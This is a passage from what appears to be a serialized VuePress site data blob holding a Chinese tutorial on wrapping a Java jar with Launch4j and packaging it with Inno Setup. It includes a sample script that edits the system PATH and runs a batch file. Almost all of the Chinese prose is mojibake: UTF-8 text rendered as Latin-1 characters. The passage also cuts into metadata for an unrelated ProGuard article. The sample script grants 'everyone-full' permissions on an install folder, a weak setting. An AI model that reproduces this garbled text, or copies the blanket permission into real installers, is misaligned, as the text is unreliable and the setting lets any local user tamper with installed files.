[Setup] é¨åä¸­ï¼ä½ å¯ä»¥æå®åç§å®è£ç¨åºçå±æ§ï¼ä¾å¦åºç¨ç¨åºåç§°ãçæ¬å·ãå®è£ç®å½ãè¾åºç®å½ç­ãä»¥ä¸æ¯ [Setup] å¯ä»¥æè¿°çä¸äºéè¦åå®¹ï¼\n\n * AppNameï¼è¿ä¸ªéé¡¹ç¨äºæå®å®è£ç¨åºçåºç¨ç¨åºåç§°ãå®å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºç»ç¨æ·ï¼éå¸¸ç¨äºå¨å¼å§èåãå¸è½½é¡¹ç­ä½ç½®æ¾ç¤ºåºç¨ç¨åºçåç§°ã\n * AppVersionï¼ç¨äºå®ä¹å®è£ç¨åºççæ¬å·ãè¿å¯ä»¥æ¯ä½ çåºç¨ç¨åºçå®éçæ¬å·ï¼ä»¥å¸®å©ç¨æ·äºè§£å®è£çåå®¹ã\n * DefaultDirNameï¼æå®é»è®¤çå®è£ç®å½ãå¯ä»¥ä½¿ç¨é¢å®ä¹çå¸¸éï¼å¦ {pf} ä»£è¡¨ Program Files ç®å½ï¼ï¼æèæå®ä¸ä¸ªå·ä½çè·¯å¾ã\n * OutputDirï¼å®ä¹çæå®è£ç¨åºçè¾åºç®å½ãè¿æ¯æå®çæçå®è£æä»¶ï¼éå¸¸æ¯ .exe æä»¶ï¼å°è¢«ä¿å­çä½ç½®ã\n * OutputBaseFilenameï¼æå®çæçå®è£ç¨åºçæä»¶åï¼éå¸¸æ¯ä¸ä¸ª .exe æä»¶ãè¿å°æ¯ç¨æ·è¿è¡çå®éå®è£ç¨åºæä»¶çåç§°ã\n * AppPublisherï¼ç¨äºæå®åºç¨ç¨åºçåå¸èæå¬å¸åç§°ï¼å®å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºã\n * AppPublisherURLï¼å¯ç¨äºæä¾åºç¨ç¨åºåå¸èçç½ç«æ URLï¼è¿ä¹å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºã\n * AppSupportURLï¼å¯ä»¥åå«æ¯ææå¸®å©ä¿¡æ¯ç URLã\n * AppUpdatesURLï¼å¦ææå³äºåºç¨ç¨åºæ´æ°çä¿¡æ¯æ URLï¼å¯ä»¥å¨è¿éæå®ã\n * AppMutexï¼ç¨äºæå®åºç¨ç¨åºçäºæ¥ä½åç§°ï¼ä»¥ç¡®ä¿å¨å®è£è¿ç¨ä¸­åªè½è¿è¡ä¸ä¸ªå®ä¾ã\n * DefaultGroupNameï¼å®ä¹å¼å§èåä¸­åºç¨ç¨åºå¿«æ·æ¹å¼çé»è®¤ç»åã\n * AllowUNCPathï¼æå®æ¯å¦åè®¸å®è£å° UNC è·¯å¾ï¼ç½ç»å±äº«è·¯å¾ï¼ã\n * UninstallDisplayIconï¼å®ä¹å¸è½½ç¨åºçæ¾ç¤ºå¾æ ã\n * UninstallDisplayNameï¼æå®å¸è½½ç¨åºçæ¾ç¤ºåç§°ã\n * UninstallStringï¼å®ä¹å¸è½½ç¨åºçæ§è¡å½ä»¤ã\n\n\n# Dirs\n\nç¨äºå®ä¹å¨ç¨æ·è®¡ç®æºä¸åå»ºçç®å½ç»æãéè¿ [Dirs] é¨åï¼ä½ å¯ä»¥æå®è¦å¨ç®æ è®¡ç®æºä¸åå»ºçç®å½ï¼ä»¥ä¾¿å¨å®è£è¿ç¨ä¸­å°æä»¶å¤å¶å°è¿äºç®å½ä¸­ãä»¥ä¸æ¯ [Dirs] å¯ä»¥æè¿°çåå®¹ï¼\n\n 1. ç®å½åç§°ï¼å¨ [Dirs] é¨åä¸­ï¼ä½ å¯ä»¥ååºè¦åå»ºçç®å½çåç§°ãè¿äºç®å½åç§°éå¸¸æ¯ç¸å¯¹äºå®è£ç®å½ï¼ç± [Setup] é¨åç DefaultDirName æå®ï¼çç¸å¯¹è·¯å¾ã\n 2. Permissionsï¼ä½ å¯ä»¥ä¸ºæ¯ä¸ªç®å½æå®æéï¼ä¾å¦è¯»ãåãæ§è¡æéãè¿åè®¸ä½ æ§å¶ç¨æ·æ¯å¦å¯ä»¥è®¿é®æä¿®æ¹è¿äºç®å½ä¸­çæä»¶ã\n 3. Subdirectoriesï¼ä½ å¯ä»¥å®ä¹å­ç®å½ï¼ä»¥ä¾¿å¨ç®å½åå»ºæ¶åæ¶åå»ºå­ç®å½ãè¿æå©äºæå»ºå¤æçç®å½ç»æ\n\n\n# Files\n\nç¨äºæå®è¦å¨å®è£è¿ç¨ä¸­åå«çæä»¶åå®ä»¬çå®è£ç®æ ãéè¿ [Files] é¨åï¼ä½ å¯ä»¥å®ä¹è¦å¤å¶å°ç®æ è®¡ç®æºä¸çæä»¶ãæä»¶çæºè·¯å¾åæä»¶çç®æ è·¯å¾ï¼ä»¥åå¶ä»æä»¶ç¸å³çå±æ§ãä»¥ä¸æ¯ [Files] å¯ä»¥æè¿°çåå®¹ï¼\n\n * Sourceï¼è¿ä¸ªå­æ®µæå®äºè¦å¤å¶çæä»¶çæºè·¯å¾ãä½ å¯ä»¥æå®å®æ´çæä»¶è·¯å¾ï¼ä¹å¯ä»¥ä½¿ç¨ééç¬¦æ¥åæ¬å¤ä¸ªæä»¶ã\n * DestDirï¼ç¨äºæå®æä»¶çç®æ ç®å½ãè¿æ¯æä»¶å¨ç¨æ·è®¡ç®æºä¸çæç»å®è£ä½ç½®ã\n * DestNameï¼æå®æä»¶å¨ç®æ è®¡ç®æºä¸çåç§°ãè¿å¯ä»¥æ¯ä¸æºæä»¶ä¸åçåç§°ã\n * Checkï¼è¿ä¸ªå­æ®µåè®¸ä½ å®ä¹æä»¶çæ£æ¥æ¹æ³ï¼ä»¥ç¡®ä¿æä»¶å¨å¤å¶å°ç®æ è®¡ç®æºä¸æ¶æ²¡æè¢«æ´æ¹ææåã\n * Permissionsï¼ä½ å¯ä»¥ä¸ºæ¯ä¸ªæä»¶å®ä¹æéï¼åæ¬æä»¶çè¯»ãåãæ§è¡æéãè¿åè®¸ä½ æ§å¶ç¨æ·å¯¹æä»¶çè®¿é®æéã\n * Attribsï¼åè®¸ä½ ä¸ºæä»¶å®ä¹å±æ§ï¼å¦åªè¯»ãéèç­ã\n * FontInstallï¼å¦æä½ çå®è£ç¨åºåå«å­ä½æä»¶ï¼ä½ å¯ä»¥ä½¿ç¨è¿ä¸ªå­æ®µæ¥å®è£å­ä½æä»¶å¹¶æ³¨åå®ä»¬ã\n * Flagsï¼ç¨äºæå®ä¸æä»¶ç¸å³çç¹å®æ å¿ï¼ä¾å¦åå»ºå¿«æ·æ¹å¼ã\n\n\n# Registry\n\nç¨äºå¨ Windows æ³¨åè¡¨ä¸­åå»ºãä¿®æ¹æå é¤é®åå¼ãéè¿ [Registry] é¨åï¼ä½ å¯ä»¥éç½®ä½ çå®è£ç¨åºå¨ç¨æ·è®¡ç®æºä¸åå»ºæ³¨åè¡¨é¡¹ï¼ä»¥å­å¨åºç¨ç¨åºçéç½®ä¿¡æ¯ãå³èæä»¶æ©å±ãæä»¶å³èç­ç­ãä»¥ä¸æ¯ [Registry] å¯ä»¥æè¿°çåå®¹ï¼\n\n * Rootï¼æå®æ³¨åè¡¨é¡¹çæ ¹é®ï¼éå¸¸æ¯ HKEY_LOCAL_MACHINE æ HKEY_CURRENT_USERãä¸åçæ ¹é®å¯¹åºä¸åçé¨åï¼ä¾å¦ HKEY_LOCAL_MACHINE ç¨äºç³»ç»èå´çè®¾ç½®ï¼è HKEY_CURRENT_USER ç¨äºå½åç¨æ·çè®¾ç½®ã\n * Subkeyï¼æå®æ³¨åè¡¨é¡¹çå­é®è·¯å¾ãè¿æ¯æ³¨åè¡¨ä¸­çç®æ ä½ç½®ã\n * ValueNameï¼å®ä¹æ³¨åè¡¨å¼çåç§°ãè¿å¯ä»¥æ¯ä¸ä¸ªå­ç¬¦ä¸²ï¼éå¸¸ç¨äºå­å¨åºç¨ç¨åºçéç½®ä¿¡æ¯ã\n * ValueTypeï¼æå®æ³¨åè¡¨å¼çç±»åï¼å¦å­ç¬¦ä¸²ãæ´æ°ç­ã\n * ValueDataï¼å®ä¹æ³¨åè¡¨å¼çæ°æ®ãè¿æ¯å®éçå¼ï¼å¯ä»¥æ¯ææ¬ãæ°å­ç­ã\n * Flagsï¼ç¨äºæå®æ³¨åè¡¨é¡¹åå¼çå±æ§ï¼ä¾å¦åå»ºãå é¤ãè¦çç­ã\n * Permissionsï¼ä½ å¯ä»¥å®ä¹æ³¨åè¡¨é¡¹çæéï¼ä»¥ç¡®ä¿åªæå·æéå½æéçç¨æ·æè½è®¿é®æä¿®æ¹æ³¨åè¡¨é¡¹ã\n\n\n# Run\n\nç¨äºå¨å®è£è¿ç¨ä¸­æå®è¦è¿è¡çå¯æ§è¡æä»¶ãèæ¬æå¶ä»ç¨åºãéè¿ [Run] é¨åï¼ä½ å¯ä»¥éç½®å®è£ç¨åºå¨å®è£å®æåæå¸è½½ç¨åºæ¶æ§è¡çæä½ãä»¥ä¸æ¯ [Run] å¯ä»¥æè¿°çåå®¹ï¼\n\n * Filenameï¼æå®è¦è¿è¡çæä»¶çè·¯å¾ï¼è¿å¯ä»¥æ¯ä¸ä¸ªå¯æ§è¡æä»¶ï¼.exeï¼ãèæ¬ï¼.batã.cmdã.vbs ç­ï¼æå¶ä»ç¨åºã\n * Parametersï¼å®ä¹è¦ä¼ éç»è¿è¡æä»¶çåæ°æå½ä»¤è¡åæ°ãè¿åè®¸ä½ åè¿è¡çç¨åºä¼ éé¢å¤çä¿¡æ¯ã\n * WorkingDirï¼æå®è¿è¡æä»¶æ¶çå·¥ä½ç®å½ãè¿æ¯è¿è¡æä»¶æå¨çç®å½ã\n * Descriptionï¼æä¾ä¸ä¸ªå¯éçæè¿°ï¼ä»¥ä¾¿å¨å®è£è¿ç¨ä¸­æ¾ç¤ºæè®°å½æ­¤æä½ã\n * Flagsï¼ç¨äºæå®è¿è¡æä½çæ å¿ï¼ä¾å¦æ¯å¦ç­å¾è¿è¡çç¨åºå®æã\n * StatusMsgï¼å®ä¹å¨æ§è¡æ­¤æä½æ¶è¦æ¾ç¤ºç»ç¨æ·çç¶ææ¶æ¯ã',normalizedContent:'è¦å°ä¸ä¸ª java jar æä»¶æåæå¯æ§è¡ç exe æä»¶ï¼å¯ä»¥ä½¿ç¨ launch4j å inno setup æ¥å®æè¿ä¸ªä»»å¡ã\n\nlaunch4j ç¨äºå° java åºç¨ç¨åºæåä¸ºæ¬æºå¯æ§è¡æä»¶ï¼éå¸¸ä¸º exe æä»¶ï¼çå·¥å·ãå®çä¸»è¦ä½ç¨æ¯åå»ºä¸ä¸ªåè£å¨ï¼åè®¸ç¨æ·åè¿è¡æ¬æº windows åºç¨ç¨åºä¸æ ·è¿è¡ java åºç¨ç¨åºï¼èæ éæå¨å¯å¨ java èææºï¼jvmï¼ã launch4j æ¯ä¸ä¸ªåè´¹çå¼æºé¡¹ç®ï¼å®éµå¾ª gnu general public licenseï¼gplï¼è®¸å¯è¯ãè¿æå³çä½ å¯ä»¥åè´¹ä½¿ç¨ launch4j æ¥åå»ºå¯æ§è¡æä»¶ï¼åæ¬åä¸ç¨éãä½ å¯ä»¥ä» launch4j çå®æ¹ç½ç«ä¸è½½å¹¶ä½¿ç¨å®ï¼æ éæ¯ä»è®¸å¯è´¹ç¨ãå®ç½å°å\n\nlaunch4j åè½æï¼\n\n * åå»ºæ¬æºå¯æ§è¡æä»¶ï¼launch4j åè®¸ä½ å°ä½ ç java åºç¨ç¨åºæåä¸ºä¸ä¸ªæ¬æºçå¯æ§è¡æä»¶ï¼éå¸¸æ¯ exe æä»¶ï¼ãè¿æå³çç¨æ·å¯ä»¥åå»è¯¥æä»¶æ¥è¿è¡ä½ ç java åºç¨ç¨åºï¼èæ éæå¨æå¼å½ä»¤è¡æ jvmã\n * èªå®ä¹å¯æ§è¡æä»¶å±æ§ï¼ä½ å¯ä»¥éè¿ launch4j éç½®å¯æ§è¡æä»¶çåç§å±æ§ï¼å¦ç¨åºå¾æ ãæä»¶çæ¬ä¿¡æ¯ãæ é¢ç­ãè¿æå©äºä½¿ä½ ç java åºç¨ç¨åºçèµ·æ¥åæ¬æº windows åºç¨ç¨åºã\n * æ¯æç±»è·¯å¾å jar æä»¶ï¼launch4j åè®¸ä½ æå®åºç¨ç¨åºçç±»è·¯å¾åå³èç jar æä»¶ï¼ä»¥ç¡®ä¿ä½ ç java åºç¨ç¨åºè½å¤æ­£å¸¸è¿è¡ã\n * èªå¨æ£æµ main-classï¼å®å¯ä»¥èªå¨æ£æµä½ ç jar æä»¶ä¸­ç main-classï¼ä»èæ éæå¨æå®åºç¨ç¨åºçå¥å£ç¹ã\n * æ¯æ jre éé¡¹ï¼ä½ å¯ä»¥éæ©å° jreï¼java è¿è¡æ¶ç¯å¢ï¼æåå°çæçå¯æ§è¡æä»¶ä¸­ï¼ä»èç¨æ·æ éå®è£ jre å³å¯è¿è¡ä½ çåºç¨ç¨åºã\n * è·¨å¹³å°å¼å®¹æ§ï¼çæçå¯æ§è¡æä»¶éå¸¸åªè½å¨ windows ä¸è¿è¡ï¼ä½ launch4j å¯ä»¥å¨ windows ä¸åå»ºç¨äºå¶ä»å¹³å°çåè£å¨ï¼ä¾å¦ linux æ macosã\n\ninno setup æ¬èº«ä¸è½ç´æ¥å° jar æä»¶æåæ exe æä»¶ãæä»¥æä»¬è¦åä½¿ç¨ launch4j æ jar æåæä¸ä¸ª exe æ ¼å¼çå¯æ§è¡ç¨åºãinno setup æ¯ä¸ä¸ªåè´¹çå¼æºå®è£å¶ä½å·¥å·ï¼å®éµå¾ªè®¸å¯è¯åè®¸åè´¹ä½¿ç¨ï¼åæ¬åä¸ç¨éãinno setup çä¸»è¦ä½ç¨æ¯åå»ºç¨äºå®è£åå¸è½½ windows åºç¨ç¨åºçå®è£ç¨åºãå®ç½å°å\n\ninno setup åè½æï¼\n\n * åå»ºèªå®ä¹å®è£ç¨åºï¼inno setup åè®¸å¼åäººååå»ºå®å¶çãæäºä½¿ç¨çå®è£ç¨åºï¼ç¨äºå°ä»ä»¬çåºç¨ç¨åºé¨ç½²å° windows æä½ç³»ç»ä¸ãä½ å¯ä»¥å®ä¹å®è£è¿ç¨çåä¸ªæ¹é¢ï¼åæ¬æä»¶å¤å¶ãæ³¨åè¡¨é¡¹ãå¿«æ·æ¹å¼ãå¼å§èåé¡¹ç­ã\n * æ¯æå¤ç§å®è£ä»»å¡ï¼inno setup æ¯æåç§åæ ·çå®è£ä»»å¡ï¼åæ¬ç®åçæä»¶å¤å¶ï¼æ³¨åè¡¨è®¾ç½®ï¼åå»ºå¿«æ·æ¹å¼ï¼ä»¥åæ§è¡èªå®ä¹èæ¬åä»»å¡ãè¿ä½¿å¾ä½ å¯ä»¥è½»æ¾å°èªå®ä¹å®è£è¿ç¨ï¼ä»¥æ»¡è¶³ä½ çåºç¨ç¨åºçç¹å®éæ±ã\n * èæ¬åï¼inno setup ä½¿ç¨åºäºèæ¬çè¯­è¨æ¥å®ä¹å®è£è¿ç¨ãè¿æå³çä½ å¯ä»¥ç¼åèæ¬æ¥æè¿°å®è£ç¨åºçè¡ä¸ºï¼ä½¿å¶éå¸¸çµæ´»ãinno setup ä½¿ç¨ç±»ä¼¼äº pascal çèæ¬è¯­è¨ã\n * å¤è¯­è¨æ¯æï¼inno setup æ¯æå¤ç§è¯­è¨ï¼åè®¸ä½ ä¸ºä¸åçç¨æ·ç¾¤ä½åå»ºå¤è¯­è¨å®è£ç¨åºï¼ä»¥æä¾æ¬å°åçå®è£åå¸è½½ä½éªã\n * å¸è½½æ¯æï¼inno setup ä¸ä»å¯ä»¥åå»ºå®è£ç¨åºï¼è¿å¯ä»¥çæå¸è½½ç¨åºï¼åè®¸ç¨æ·ä»ä»ä»¬çè®¡ç®æºä¸å¸è½½ä½ çåºç¨ç¨åºã\n\n\n# ä½¿ç¨ launch4j\n\nlaunch4j æ jar åè£æ .exe ç¨åºè¿æ¯ææå±éçï¼æ¯å¦å¯å¨æ¹å¼åªè½æ¯ java -jarï¼å¦æéåæ··æ·å°±æ²¡æåæ³\n\n\n# basic\n\nå¨è¿ééç½®è·¯å¾ç­ä¿¡æ¯\n\n\n\noutput file: å¡«åæ jar ææ.exe ç¨åºçè¾åºè·¯å¾\njarï¼éæ©èªå·±è¦æåç jar\n\n\n# jre\n\nå¨è¿ééç½® jvmï¼jdk çæ¬ç­ä¿¡æ¯\n\n\n\njre pathsï¼ä¸éè¦æä»¬å¡«\nmin jre versionï¼æä½ jdk çæ¬\nmax jre versionï¼æé« jdk çæ¬\njvm optionï¼è®¾ç½® jvm å¯å¨åæ°\n\n\n#\n\nè®¾ç½® console\n\n\n\n# ä½¿ç¨ inno setup\n\ninno setup è¿æ¯æäºé¾åº¦çï¼éè¦å­¦ä¹ éé¢çåä¸ªå³é®å­ï¼åè°ï¼äºä»¶ç­ï¼æè½ææ¡ inno setup çä½¿ç¨\n\nä»¥ä¸è´´ä¸ä¸ªç®åç inno setup ç¤ºä¾\n\n;éç½®åæè¿°å®è£ç¨åºçæ´ä½è®¾ç½®åè¡ä¸º\n[setup]\n; åºç¨åç§°\nappname=easy-manager-tool\n; åºç¨çæ¬\nappversion=1.0\n; é»è®¤å®è£ç®å½ {pf}ä¸º program files è¿ä¸ªè·¯å¾æ¯ç±»ä¼¼äº c:\\program files çå½¢å¼\ndefaultdirname={pf}\\emt\n; åºç¨è¾åºå°æä»¶è·¯å¾\noutputdir=c:\\users\\user\\desktop\\tool\\gen\n; è¾åºæä»¶çåç§°\noutputbasefilename=emt\n; æå®åºç¨ç¨åºçåå¸èæå¬å¸åç§°\napppublisher=\n; åºç¨ç¨åºåå¸èçç½ç«æurl\napppublisherurl=\n\n; åå»ºç®å½ {app} å½è¡¨åºç¨æå¨çè·¯å¾\n[dirs]\nname: "{app}\\go"; permissions: everyone-full\n\n; æ·»å æä»¶\n[files]\nsource: "c:\\users\\user\\desktop\\build\\*"; destdir: "{app}"; flags: ignoreversion recursesubdirs createallsubdirs\n\n; æ³¨åè¡¨\n[registry]\nroot: hklm; subkey: "system\\currentcontrolset\\control\\session manager\\environment"; valuetype: string; valuename: "path"; valuedata: "{olddata};{app}\\jdk\\bin"\n\n; è¿è¡èæ¬\n[run]\nfilename: "{sys}\\cmd.exe"; parameters: "/c setx path ""{app}\\go\\bin;%path%"""; flags: runasoriginaluser; statusmsg: "setting path for go..."; check: not is64bitinstallmode\nfilename: "{app}\\runbuild.bat"; description: "runbuild.bat";\nfilename: "cmd.exe"; parameters: "/c setx path ""%path%;{app}\\jdk\\bin"" /m"; flags: runhidden; workingdir: {app}; statusmsg: "updating path environment variable..."\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# setup\n\nç¨äºéç½®åæè¿°å®è£ç¨åºçæ´ä½è®¾ç½®åè¡ä¸ºãå¨ [setup] é¨åä¸­ï¼ä½ å¯ä»¥æå®åç§å®è£ç¨åºçå±æ§ï¼ä¾å¦åºç¨ç¨åºåç§°ãçæ¬å·ãå®è£ç®å½ãè¾åºç®å½ç­ãä»¥ä¸æ¯ [setup] å¯ä»¥æè¿°çä¸äºéè¦åå®¹ï¼\n\n * appnameï¼è¿ä¸ªéé¡¹ç¨äºæå®å®è£ç¨åºçåºç¨ç¨åºåç§°ãå®å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºç»ç¨æ·ï¼éå¸¸ç¨äºå¨å¼å§èåãå¸è½½é¡¹ç­ä½ç½®æ¾ç¤ºåºç¨ç¨åºçåç§°ã\n * appversionï¼ç¨äºå®ä¹å®è£ç¨åºççæ¬å·ãè¿å¯ä»¥æ¯ä½ çåºç¨ç¨åºçå®éçæ¬å·ï¼ä»¥å¸®å©ç¨æ·äºè§£å®è£çåå®¹ã\n * defaultdirnameï¼æå®é»è®¤çå®è£ç®å½ãå¯ä»¥ä½¿ç¨é¢å®ä¹çå¸¸éï¼å¦ {pf} ä»£è¡¨ program files ç®å½ï¼ï¼æèæå®ä¸ä¸ªå·ä½çè·¯å¾ã\n * outputdirï¼å®ä¹çæå®è£ç¨åºçè¾åºç®å½ãè¿æ¯æå®çæçå®è£æä»¶ï¼éå¸¸æ¯ .exe æä»¶ï¼å°è¢«ä¿å­çä½ç½®ã\n * outputbasefilenameï¼æå®çæçå®è£ç¨åºçæä»¶åï¼éå¸¸æ¯ä¸ä¸ª .exe æä»¶ãè¿å°æ¯ç¨æ·è¿è¡çå®éå®è£ç¨åºæä»¶çåç§°ã\n * apppublisherï¼ç¨äºæå®åºç¨ç¨åºçåå¸èæå¬å¸åç§°ï¼å®å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºã\n * apppublisherurlï¼å¯ç¨äºæä¾åºç¨ç¨åºåå¸èçç½ç«æ urlï¼è¿ä¹å°å¨å®è£è¿ç¨ä¸­æ¾ç¤ºã\n * appsupporturlï¼å¯ä»¥åå«æ¯ææå¸®å©ä¿¡æ¯ç urlã\n * appupdatesurlï¼å¦ææå³äºåºç¨ç¨åºæ´æ°çä¿¡æ¯æ urlï¼å¯ä»¥å¨è¿éæå®ã\n * appmutexï¼ç¨äºæå®åºç¨ç¨åºçäºæ¥ä½åç§°ï¼ä»¥ç¡®ä¿å¨å®è£è¿ç¨ä¸­åªè½è¿è¡ä¸ä¸ªå®ä¾ã\n * defaultgroupnameï¼å®ä¹å¼å§èåä¸­åºç¨ç¨åºå¿«æ·æ¹å¼çé»è®¤ç»åã\n * allowuncpathï¼æå®æ¯å¦åè®¸å®è£å° unc è·¯å¾ï¼ç½ç»å±äº«è·¯å¾ï¼ã\n * uninstalldisplayiconï¼å®ä¹å¸è½½ç¨åºçæ¾ç¤ºå¾æ ã\n * uninstalldisplaynameï¼æå®å¸è½½ç¨åºçæ¾ç¤ºåç§°ã\n * uninstallstringï¼å®ä¹å¸è½½ç¨åºçæ§è¡å½ä»¤ã\n\n\n# dirs\n\nç¨äºå®ä¹å¨ç¨æ·è®¡ç®æºä¸åå»ºçç®å½ç»æãéè¿ [dirs] é¨åï¼ä½ å¯ä»¥æå®è¦å¨ç®æ è®¡ç®æºä¸åå»ºçç®å½ï¼ä»¥ä¾¿å¨å®è£è¿ç¨ä¸­å°æä»¶å¤å¶å°è¿äºç®å½ä¸­ãä»¥ä¸æ¯ [dirs] å¯ä»¥æè¿°çåå®¹ï¼\n\n 1. ç®å½åç§°ï¼å¨ [dirs] é¨åä¸­ï¼ä½ å¯ä»¥ååºè¦åå»ºçç®å½çåç§°ãè¿äºç®å½åç§°éå¸¸æ¯ç¸å¯¹äºå®è£ç®å½ï¼ç± [setup] é¨åç defaultdirname æå®ï¼çç¸å¯¹è·¯å¾ã\n 2. permissionsï¼ä½ å¯ä»¥ä¸ºæ¯ä¸ªç®å½æå®æéï¼ä¾å¦è¯»ãåãæ§è¡æéãè¿åè®¸ä½ æ§å¶ç¨æ·æ¯å¦å¯ä»¥è®¿é®æä¿®æ¹è¿äºç®å½ä¸­çæä»¶ã\n 3. subdirectoriesï¼ä½ å¯ä»¥å®ä¹å­ç®å½ï¼ä»¥ä¾¿å¨ç®å½åå»ºæ¶åæ¶åå»ºå­ç®å½ãè¿æå©äºæå»ºå¤æçç®å½ç»æ\n\n\n# files\n\nç¨äºæå®è¦å¨å®è£è¿ç¨ä¸­åå«çæä»¶åå®ä»¬çå®è£ç®æ ãéè¿ [files] é¨åï¼ä½ å¯ä»¥å®ä¹è¦å¤å¶å°ç®æ è®¡ç®æºä¸çæä»¶ãæä»¶çæºè·¯å¾åæä»¶çç®æ è·¯å¾ï¼ä»¥åå¶ä»æä»¶ç¸å³çå±æ§ãä»¥ä¸æ¯ [files] å¯ä»¥æè¿°çåå®¹ï¼\n\n * sourceï¼è¿ä¸ªå­æ®µæå®äºè¦å¤å¶çæä»¶çæºè·¯å¾ãä½ å¯ä»¥æå®å®æ´çæä»¶è·¯å¾ï¼ä¹å¯ä»¥ä½¿ç¨ééç¬¦æ¥åæ¬å¤ä¸ªæä»¶ã\n * destdirï¼ç¨äºæå®æä»¶çç®æ ç®å½ãè¿æ¯æä»¶å¨ç¨æ·è®¡ç®æºä¸çæç»å®è£ä½ç½®ã\n * destnameï¼æå®æä»¶å¨ç®æ è®¡ç®æºä¸çåç§°ãè¿å¯ä»¥æ¯ä¸æºæä»¶ä¸åçåç§°ã\n * checkï¼è¿ä¸ªå­æ®µåè®¸ä½ å®ä¹æä»¶çæ£æ¥æ¹æ³ï¼ä»¥ç¡®ä¿æä»¶å¨å¤å¶å°ç®æ è®¡ç®æºä¸æ¶æ²¡æè¢«æ´æ¹ææåã\n * permissionsï¼ä½ å¯ä»¥ä¸ºæ¯ä¸ªæä»¶å®ä¹æéï¼åæ¬æä»¶çè¯»ãåãæ§è¡æéãè¿åè®¸ä½ æ§å¶ç¨æ·å¯¹æä»¶çè®¿é®æéã\n * attribsï¼åè®¸ä½ ä¸ºæä»¶å®ä¹å±æ§ï¼å¦åªè¯»ãéèç­ã\n * fontinstallï¼å¦æä½ çå®è£ç¨åºåå«å­ä½æä»¶ï¼ä½ å¯ä»¥ä½¿ç¨è¿ä¸ªå­æ®µæ¥å®è£å­ä½æä»¶å¹¶æ³¨åå®ä»¬ã\n * flagsï¼ç¨äºæå®ä¸æä»¶ç¸å³çç¹å®æ å¿ï¼ä¾å¦åå»ºå¿«æ·æ¹å¼ã\n\n\n# registry\n\nç¨äºå¨ windows æ³¨åè¡¨ä¸­åå»ºãä¿®æ¹æå é¤é®åå¼ãéè¿ [registry] é¨åï¼ä½ å¯ä»¥éç½®ä½ çå®è£ç¨åºå¨ç¨æ·è®¡ç®æºä¸åå»ºæ³¨åè¡¨é¡¹ï¼ä»¥å­å¨åºç¨ç¨åºçéç½®ä¿¡æ¯ãå³èæä»¶æ©å±ãæä»¶å³èç­ç­ãä»¥ä¸æ¯ [registry] å¯ä»¥æè¿°çåå®¹ï¼\n\n * rootï¼æå®æ³¨åè¡¨é¡¹çæ ¹é®ï¼éå¸¸æ¯ hkey_local_machine æ hkey_current_userãä¸åçæ ¹é®å¯¹åºä¸åçé¨åï¼ä¾å¦ hkey_local_machine ç¨äºç³»ç»èå´çè®¾ç½®ï¼è hkey_current_user ç¨äºå½åç¨æ·çè®¾ç½®ã\n * subkeyï¼æå®æ³¨åè¡¨é¡¹çå­é®è·¯å¾ãè¿æ¯æ³¨åè¡¨ä¸­çç®æ ä½ç½®ã\n * valuenameï¼å®ä¹æ³¨åè¡¨å¼çåç§°ãè¿å¯ä»¥æ¯ä¸ä¸ªå­ç¬¦ä¸²ï¼éå¸¸ç¨äºå­å¨åºç¨ç¨åºçéç½®ä¿¡æ¯ã\n * valuetypeï¼æå®æ³¨åè¡¨å¼çç±»åï¼å¦å­ç¬¦ä¸²ãæ´æ°ç­ã\n * valuedataï¼å®ä¹æ³¨åè¡¨å¼çæ°æ®ãè¿æ¯å®éçå¼ï¼å¯ä»¥æ¯ææ¬ãæ°å­ç­ã\n * flagsï¼ç¨äºæå®æ³¨åè¡¨é¡¹åå¼çå±æ§ï¼ä¾å¦åå»ºãå é¤ãè¦çç­ã\n * permissionsï¼ä½ å¯ä»¥å®ä¹æ³¨åè¡¨é¡¹çæéï¼ä»¥ç¡®ä¿åªæå·æéå½æéçç¨æ·æè½è®¿é®æä¿®æ¹æ³¨åè¡¨é¡¹ã\n\n\n# run\n\nç¨äºå¨å®è£è¿ç¨ä¸­æå®è¦è¿è¡çå¯æ§è¡æä»¶ãèæ¬æå¶ä»ç¨åºãéè¿ [run] é¨åï¼ä½ å¯ä»¥éç½®å®è£ç¨åºå¨å®è£å®æåæå¸è½½ç¨åºæ¶æ§è¡çæä½ãä»¥ä¸æ¯ [run] å¯ä»¥æè¿°çåå®¹ï¼\n\n * filenameï¼æå®è¦è¿è¡çæä»¶çè·¯å¾ï¼è¿å¯ä»¥æ¯ä¸ä¸ªå¯æ§è¡æä»¶ï¼.exeï¼ãèæ¬ï¼.batã.cmdã.vbs ç­ï¼æå¶ä»ç¨åºã\n * parametersï¼å®ä¹è¦ä¼ éç»è¿è¡æä»¶çåæ°æå½ä»¤è¡åæ°ãè¿åè®¸ä½ åè¿è¡çç¨åºä¼ éé¢å¤çä¿¡æ¯ã\n * workingdirï¼æå®è¿è¡æä»¶æ¶çå·¥ä½ç®å½ãè¿æ¯è¿è¡æä»¶æå¨çç®å½ã\n * descriptionï¼æä¾ä¸ä¸ªå¯éçæè¿°ï¼ä»¥ä¾¿å¨å®è£è¿ç¨ä¸­æ¾ç¤ºæè®°å½æ­¤æä½ã\n * flagsï¼ç¨äºæå®è¿è¡æä½çæ å¿ï¼ä¾å¦æ¯å¦ç­å¾è¿è¡çç¨åºå®æã\n * statusmsgï¼å®ä¹å¨æ§è¡æ­¤æä½æ¶è¦æ¾ç¤ºç»ç¨æ·çç¶ææ¶æ¯ã',charsets:{cjk:!0}},{title:"javaä»£ç æ··æ·ä¹ ProGuard",frontmatter:{title:"javaä»£ç æ··æ·ä¹ ProGuard",date:"2023-06-25T09:22:36.000Z",permalink:"/java/102/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.java/10.java/102.java%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E4%B9%8BProGuard.html",relativePath:"00.java/10.java/102.javaä»£ç æ··æ·ä¹ProGuard.md",key:"v-2acc2292",path:"/java/102/",headers:[{level:2,title:"æ·»å ä¾èµ",slug:"æ·»å ä¾èµ",normalizedTitle:"æ·»å ä¾èµ",charIndex:218},{level:2,title:"éç½®ProGuard",slug:"éç½®proguard",normalizedTitle:"éç½® 